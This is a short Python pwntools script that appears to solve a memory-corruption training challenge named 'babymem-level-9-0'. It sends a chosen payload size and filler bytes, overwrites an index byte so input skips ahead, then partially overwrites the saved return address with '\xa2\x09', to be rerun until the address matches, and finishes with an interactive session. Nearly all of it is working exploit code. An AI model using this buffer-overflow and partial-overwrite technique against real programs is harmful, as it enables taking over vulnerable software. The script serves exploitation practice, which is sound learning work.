from pwn import *

# First, payload_size = 138
# Wait till reading into 116 (that's where 'n' is), enter "\x86"
# It will then start reading at 136 (that's where 'ret_addr" is), enter '\xa2\x09'
# Re-run it until it hits

payload = b""

p = process("./babymem-level-9-0")

res = p.recvuntil(b"Payload size: ")
print(res)
p.sendline(b"138")

res = p.recvuntil(b"start of the input buffer.\n")
print(res)
p.sendline(b"A" * 115)

p.sendline(b"\x86")
res = p.recvuntil(b"this is 136 bytes away from the start of the input buffer.\n")
print(res)

p.sendline(b"\xa2\x09")

p.interactive()
